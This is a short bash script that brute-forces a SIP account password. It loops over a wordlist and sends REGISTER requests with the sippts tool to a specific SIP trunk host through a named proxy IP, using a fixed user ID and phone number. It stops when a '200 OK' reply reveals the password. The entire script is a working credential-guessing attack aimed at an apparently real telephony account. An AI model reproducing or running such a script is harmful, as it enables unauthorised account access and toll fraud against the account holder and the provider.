#!/bin/bash

# Check if wordlist.txt exists
if [ ! -f wordlist.txt ]; then
    echo "wordlist.txt not found!"
    exit 1
fi

# Iterate over each line in wordlist.txt
while IFS= read -r password; do
    echo "Trying password: $password"
    
    # Execute the sippts command with the current password and capture the output
    output=$(python3 ./build/scripts-3.12/sippts send \
    -i siptrunk2.ver.sul.t-online.de \
    -r 5060 \
    -p tcp \
    -proxy 80.156.100.67:5060 \
    -m register \
    -fu +4991244378510 \
    -fd siptrunk2.ver.sul.t-online.de \
    -td siptrunk2.ver.sul.t-online.de \
    -ua "PhonerLite/3.26" \
    -user 550214025190 \
    -pass "$password" \
    -v \
    -d siptrunk2.ver.sul.t-online.de)

    # Check if the output contains "200 OK"
    if echo "$output" | grep -q "200 OK"; then
        echo "PASSWORD FOUND: $password"
        exit 0
    fi

done < wordlist.txt

echo "Password not found in the wordlist."
exit 1